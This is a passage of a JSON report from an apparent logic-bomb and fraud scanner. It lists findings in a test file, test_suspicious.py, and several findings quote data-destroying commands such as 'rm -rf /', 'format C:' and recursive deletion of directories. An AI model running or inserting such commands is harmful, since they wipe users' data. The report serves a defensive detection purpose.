      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T21:14:32.254796"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "shutil.rmtree('/important_data')",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.257791",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "test_suspicious.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
      "id": "2e7ece32-d1b2-45c9-84ca-08d53c0c77ab",
      "last_modified": "",
      "line_number": 12,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T21:14:32.257791"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.system('format C:')",
      "column": 8,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.257791",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "test_suspicious.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
      "id": "b7681536-0b1e-4453-8d45-b90c4114dfdb",
      "last_modified": "",
      "line_number": 13,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "System formatting - Complete data destruction",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T21:14:32.257791"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "subprocess.call(['rm', '-rf', '/'])",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.258792",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "test_suspicious.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
      "id": "c2be6b8a-8662-4be7-b91d-08991d5ded89",
      "last_modified": "",
      "line_number": 14,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T21:14:32.258792"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.remove('/critical_file.txt')",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T21:14:32.258792",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "test_suspicious.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
      "id": "3cc709f4-507d-4bc3-a97d-dbb7bd829dd7",
      "last_modified": "",
      "line_number": 28,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "File/directory deletion - Data loss risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T21:14:32.258792"
    }
  ],
  "issues_found": 49,
  "lines_of_code": 1031,
  "project_id": "vscode-workspace-1754927072180",
  "quality_gate_status": "BLOCKED",
  "scan_id": "4f0c5238-94c4-41e5-b2ca-7b5601d7d550",
  "timestamp": "2025-08-11T21:14:32.189803",
  "logic_bomb_risk_score": 0,
  "threat_shield_status": "BLOCKED"
}